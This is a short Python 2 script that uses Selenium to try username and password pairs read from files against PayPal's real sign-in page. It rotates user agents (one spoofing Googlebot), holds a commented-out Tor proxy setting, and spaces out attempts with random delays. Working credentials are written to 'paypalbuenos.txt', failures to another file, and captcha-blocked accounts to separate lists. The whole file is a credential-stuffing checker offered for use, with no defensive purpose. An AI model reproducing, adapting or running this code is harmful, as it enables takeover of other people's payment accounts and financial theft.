import time
#from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import random
#Variables globales



#PayPay:Resumen
def login_paypal(user,password):
    try:
        agent_list = ['Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36"
        ]
        #random.choice(agent_list)
        user_agent = random.choice(agent_list)
        profile = webdriver.FirefoxProfile()
        profile.set_preference("general.useragent.override",str(user_agent))
        #profile.set_preference('network.proxy.type', 1)
        #profile.set_preference('network.proxy.socks', '127.0.0.1')
        #profile.set_preference('network.proxy.socks_port', 9050)
        driver = webdriver.Firefox(profile)
        driver.get("https://www.paypal.com/signin")
        driver.maximize_window()
        elemento = driver.find_element_by_name("login_email")
        elemento.clear()
        elemento.send_keys(user)
        elemento = driver.find_element_by_name("login_password")
        elemento.clear()
        elemento.send_keys(password)
        driver.find_element_by_id("btnLogin").click()
        time.sleep(3)
        assert(("Log in to your PayPal account") in driver.title)
        try:
            captcha = driver.find_element_by_name("captcha")
            print "Cuenta con Captcha {}:{}".format(user,password)
            with open("captcha/cuentas.txt","a") as f:
                f.write(user+"\n")
            with open("captcha/password.txt","a") as f:
                f.write(password+"\n")
        except:
            pass
        print "Cuenta Incorrecta {}:{}".format(user,password)
        with open("PayPalMalos.txt","a") as f:
            f.write(str(user)+":"+str(password)+"\n")
        driver.delete_all_cookies()
        driver.close()
        time.sleep(random.randrange(4,10))
    except AssertionError:
        print "Cuenta Buena {}:{}".format(user,password)
        with open("paypalbuenos.txt","a") as f:
            f.write(user+":"+password+"\n")
        driver.delete_all_cookies()
        driver.close()
        time.sleep(random.randrange(4,10))
    except Exception as e:
        #hola = driver.find_element_by_name("captcha")
        print "GoodBye"
        print e




def atackk():
    user = []
    password = []

    with open("cuentas.txt","r") as f:
        for i in f.xreadlines():
            user.append(i.replace("\n",""))
    with open("password.txt","r") as f:
        for i in f.xreadlines():
            password.append(i.replace("\n",""))



    for x,y in map(None,user,password):
        login_paypal(x,y)


atackk()
